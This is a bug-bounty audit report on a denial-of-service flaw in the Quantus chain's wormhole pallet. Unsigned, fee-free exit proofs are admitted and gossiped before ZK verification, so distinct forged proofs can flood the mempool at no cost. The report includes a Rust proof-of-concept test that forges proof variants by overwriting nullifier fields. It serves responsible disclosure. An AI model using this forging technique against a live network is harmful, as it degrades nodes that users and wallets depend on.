# 88768 bc medium zero cost mempool flooding via fee free unsigned wormhole exit admission causes network processing nodes to process transactions beyond set parameters

**Submitted on Aug 15th 2026 at 00:19:54 UTC by @OxPrince for** [**Audit Comp | Quantus**](https://immunefi.com/audit-competition/audit-comp-quantus)

* **Report ID:** #88768
* **Report Type:** Blockchain/DLT
* **Report severity:** Medium
* **Target:** <https://github.com/immunefi-team/audit-comp-quantus-chain>
* **Impacts:**
  * Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)

## Description

## Brief/Intro

Wormhole exit extrinsics (`verify_private_batch` / `verify_public_batch`) are **unsigned, fee-free (`Pays::No`), and gossiped** (`propagate(true)`). To admit one into the mempool, every node must deserialize a \~150–224 KB plonky2 proof, canonically re-serialize it, parse its public inputs, and perform up to \~372 storage reads — roughly **1000× the validation cost of a normal transfer** (the pallet's own benchmark: 0.9 ms private / 1.9 ms public) — all *before* the ZK verify, which is deferred to block inclusion. Because the lane charges no fee and the mempool's only anti-duplication key is the proof's nullifier, an attacker can mint **unlimited distinct** admissible proofs (each with a fresh nullifier) from a single template, at zero cost. Every one is admitted, re-gossiped to the whole network, and can **never be mined** (the deferred ZK gate rejects it) — so they exist only to burn each node's CPU, bandwidth, and mempool space. If exploited on mainnet, a single unprivileged actor with only bandwidth can force every node in the network to continuously perform expensive, un-includable validation work, degrading the nodes that serve users (RPC endpoints, wallets, indexers) and crowding out the legitimate fee-free exit lane, for as long as the flood continues.

## Vulnerability Details

{% stepper %}
{% step %}

## Admission is fee-free and verify-free, but not cheap

Pool admission runs `validate_unsigned`, which deliberately skips the ZK verify but still performs the full parse and cheap bundle checks, and returns `propagate(true)` ([`pallets/wormhole/src/lib.rs:1006-1043`](broken://pages/4a4566a3468428d6021551610e6c2c540b46455b#L1006-L1043)):

```rust
fn validate_unsigned(_source: TransactionSource, call: &Self::Call) -> TransactionValidity {
    match call {
        Call::verify_public_batch { proof_bytes } => {
            let (_, _, bundle, _validity) =
                Self::pre_validate_public_batch_proof(proof_bytes)   // parse + up to 372 reads
                    .map_err(|_| InvalidTransaction::Call)?;
            ValidTransaction::with_tag_prefix("WormholePublicBatch")
                .and_provides(Self::exit_bundle_provides_tag(&bundle))  // tag = hash(nullifiers)
                .priority(crate::UNSIGNED_EXIT_PRIORITY)               // constant 1
                .longevity(5)
                .propagate(true)                                       // re-gossiped
                .build()
        },
        // ... verify_private_batch: same shape ...
    }
}
```

`pre_validate_public_batch_proof` ([`lib.rs:1184-1224`](broken://pages/4a4566a3468428d6021551610e6c2c540b46455b#L1184-L1224)) copies the blob (`to_vec`), `ProofWithPublicInputs::from_bytes` parses it, `proof.to_bytes()` re-serializes it for the canonical check, `parse_public_batch_public_inputs` reads the public inputs, and `validate_exit_bundle_common` → `segment_validity` performs **one `UsedNullifiers::contains_key` trie read per nullifier** ([`lib.rs:700`](broken://pages/4a4566a3468428d6021551610e6c2c540b46455b#L700)) plus a `block_hash` read ([`lib.rs:1104`](broken://pages/4a4566a3468428d6021551610e6c2c540b46455b#L1104)).

The pallet's own weights quantify the cost ([`pallets/wormhole/src/weights.rs:67-72`](broken://pages/515f9e55a50968a7d0a230998234f8fb654a78d1#L67-L72)):

```rust
const PRIVATE_BATCH_PRE_VALIDATE_REF_TIME_PS: u64 = 900_000_000;   // 0.9 ms
const PUBLIC_BATCH_PRE_VALIDATE_REF_TIME_PS: u64  = 1_900_000_000; // 1.9 ms
```

and the read count is `NUM_PRIVATE_BATCH_PROOFS * NUM_LEAF_PROOFS = 53 * 7 = 371` nullifier reads for public-batch, `NUM_LEAF_PROOFS = 7` for private-batch ([`weights.rs:147-162`](broken://pages/515f9e55a50968a7d0a230998234f8fb654a78d1#L147-L162)). All of this runs at pool admission, on every gossiped proof, on every node. A normal signed transfer, by contrast, costs a signature check and a nonce read.
{% endstep %}

{% step %}

## Nothing bounds the number of distinct admissible junk proofs

The mempool holds one entry per `provides` tag, and the tag is `blake2_256(nullifier bytes)` ([`exit_bundle_provides_tag`, `lib.rs:1247-1255`](broken://pages/4a4566a3468428d6021551610e6c2c540b46455b#L1247-L1255)). This dedup and the `NonCanonicalProofEncoding` check work **as intended** — they collapse *byte-variants of one logical exit* into a single entry. **This is not a claim that the dedup is broken.**

The gap is that nothing bounds *distinct* submissions. Since `validate_unsigned` never runs the ZK verify, the nullifier felts in the public inputs are **unchecked at admission** — the attacker sets them freely. Starting from any structurally valid proof blob, they overwrite the nullifier felt and re-serialize canonically, producing an endless stream of proofs that are each a genuinely distinct mempool entry, each passing admission. There is no per-peer or per-block admission budget on this expensive, fee-free path, so the count is bounded only by attacker bandwidth.

A forged proof also does **not** trip peer-reputation anti-spam: it is *valid* as far as `validate_unsigned` (the network-facing gate) is concerned, so no node down-scores the sender. Only `pre_dispatch` rejects it — and that runs on the block author during block-building, not on every gossiping node, and carries no ban.
{% endstep %}

{% step %}

## The forged proofs can never be mined

The ZK verify is the block-inclusion gate in `pre_dispatch` ([`lib.rs:1045-1062`](broken://pages/4a4566a3468428d6021551610e6c2c540b46455b#L1045-L1062)), which rejects every forged proof. So the junk is never included in a block — it exists purely to be validated and re-gossiped, until its `longevity(5)` expires, at which point the attacker sends more. The attacker pays nothing (unsigned, `Pays::No`).
{% endstep %}
{% endstepper %}

## Impact Details

* **Attacker cost: zero.** The lane is unsigned and `Pays::No`; the only expense is bandwidth. No hashrate, stake, funded account, or privileged access is required.
* **Asymmetric work amplification.** A normal transaction is fee-gated and costs microseconds to validate. Each forged exit is fee-free *and* costs \~0.9–1.9 ms of CPU plus up to 372 trie reads, with no rate limit — an economic gate that normally bounds mempool processing is simply absent on this path.
* **Network-wide propagation.** `propagate(true)` means each admitted junk proof is re-broadcast, so one attacker's upload is multiplied across the network: send *X* MB once, every node parses *X* MB and re-emits *X* MB.
* **Degrades the user-facing infrastructure first.** Non-mining nodes never shed the junk, so RPC endpoints, wallet backends, and indexers accumulate and re-gossip it continuously — the parts of the network users and applications actually depend on.
* **Crowds out legitimate exits.** Genuine wormhole exits carry the same `priority = 1` as the forged ones, so real exits compete for mempool space against an attacker-controlled flood of look-alikes. (Ordinary signed transfers are **not** affected — they sit on a far higher priority tier; this is a targeted degradation of the fee-free exit lane and general node resources, not a full chain halt.)
* **Cheap to sustain.** Forged proofs expire after `longevity(5)` blocks; the attacker simply keeps sending. It self-heals only when the attacker stops — a temporary resource-exhaustion / griefing pressure lasting exactly as long as the (bandwidth-only) flood.

## References

* [`pallets/wormhole/src/lib.rs:1002-1063`](broken://pages/4a4566a3468428d6021551610e6c2c540b46455b#L1002-L1063) — `validate_unsigned` (verify-free admission) / `pre_dispatch` (ZK inclusion gate)
* [`pallets/wormhole/src/lib.rs:1184-1224`](broken://pages/4a4566a3468428d6021551610e6c2c540b46455b#L1184-L1224) — `pre_validate_public_batch_proof` (parse + reads at admission)
* [`pallets/wormhole/src/lib.rs:669-710`](broken://pages/4a4566a3468428d6021551610e6c2c540b46455b#L669-L710) — `segment_validity`, the per-nullifier `UsedNullifiers::contains_key` reads
* [`pallets/wormhole/src/lib.rs:1247-1255`](broken://pages/4a4566a3468428d6021551610e6c2c540b46455b#L1247-L1255) — `exit_bundle_provides_tag` (nullifier-keyed dedup)
* [`pallets/wormhole/src/weights.rs:64-162`](broken://pages/515f9e55a50968a7d0a230998234f8fb654a78d1#L64-L162) — 0.9 ms / 1.9 ms pre-validate benchmark and read counts

## Proof of Concept

```rust
// ================================================================
    // AUDIT (mempool flood lane): unsigned wormhole exit admission
    // ================================================================

    use qp_wormhole_verifier::D as VD;

    /// First nullifier felt index in the aggregated private-batch PI layout:
    /// header(8) + [sum(1),exit(4)]*(2*N) then N nullifiers of 4 felts each.
    fn first_nullifier_felt_index() -> usize {
        let n = crate::circuit_config::NUM_LEAF_PROOFS;
        8 + (2 * n) * 5
    }

    /// Deserialize the fixture, overwrite one nullifier felt, and re-serialize to
    /// CANONICAL bytes: a structurally valid, DISTINCT proof blob whose ZK proof no
    /// longer matches its public inputs.
    fn forge_variant(tweak: u64) -> Vec<u8> {
        let verifier = crate::get_private_batch_verifier().expect("verifier available");
        let mut proof = ProofWithPublicInputs::<F, C, VD>::from_bytes(
            get_test_proof_bytes(),
            &verifier.circuit_data.common,
        )
        .expect("fixture deserializes");
        let idx = first_nullifier_felt_index();
        proof.public_inputs[idx] =
            <qp_wormhole_verifier::F as qp_plonky2_verifier::field::types::Field>::from_canonical_u64(tweak);
        proof.to_bytes()
    }

    fn setup_block_for_fixture() {
        let proof = deserialize_test_proof();
        let inputs = parse_private_batch_public_inputs(&proof).expect("parse");
        let block_number = inputs.block_data.block_number as u64;
        let block_hash_bytes: [u8; 32] =
            inputs.block_data.block_hash.as_ref().try_into().unwrap();
        frame_system::BlockHash::<Test>::insert(block_number, H256::from(block_hash_bytes));
        System::set_block_number(block_number + 10);
    }

    /// PoC : unlimited DISTINCT unsigned junk proofs are (a) ADMITTED by the real
    /// `ValidateUnsigned::validate_unsigned` pool entry point, (b) each carry a DISTINCT
    /// `provides` tag so the pool does not dedupe them, and (c) each REJECTED by the real
    /// `ValidateUnsigned::pre_dispatch` block-inclusion gate — so they can never be mined
    /// and exist only to be validated and re-gossiped. Attacker cost: 0 (unsigned, Pays::No).
    #[test]
    fn poc_distinct_junk_proofs_all_pass_admission_and_are_undeduplicated() {
        use sp_runtime::{traits::ValidateUnsigned, transaction_validity::TransactionSource};
        use std::collections::BTreeSet;

        new_test_ext().execute_with(|| {
            setup_block_for_fixture();

            let mut tags = BTreeSet::new();
            const N: u64 = 64;
            for k in 1..=N {
                let bytes = forge_variant(0xA11CE_0000 + k);
                let call = crate::Call::<Test>::verify_private_batch { proof_bytes: bytes };

                // (a) real pool admission accepts it (cheap checks only, NO ZK verify)
                let valid = <Wormhole as ValidateUnsigned>::validate_unsigned(
                    TransactionSource::External,
                    &call,
                )
                .expect("forged variant is admitted to the pool by validate_unsigned");

                // (b) the ACTUAL pool dedup key (`provides`) is distinct per variant
                assert!(
                    tags.insert(valid.provides.clone()),
                    "each forged variant carries a distinct `provides` tag => undeduplicated"
                );

                // (c) the real inclusion gate runs the ZK verify and REJECTS it
                assert!(
                    <Wormhole as ValidateUnsigned>::pre_dispatch(&call).is_err(),
                    "pre_dispatch (ZK verify) must reject the forged proof => never mineable"
                );
            }
            assert_eq!(tags.len() as u64, N, "all {N} junk proofs are undeduplicated");
            println!(
                "PoC: {N} distinct unsigned junk proofs were each ADMITTED by validate_unsigned \
                 with {N} distinct `provides` tags, and each REJECTED by pre_dispatch (ZK verify). \
                 Un-mineable, undeduplicated, gossiped. Attacker cost: 0 (unsigned, Pays::No)."
            );
        });
    }
```
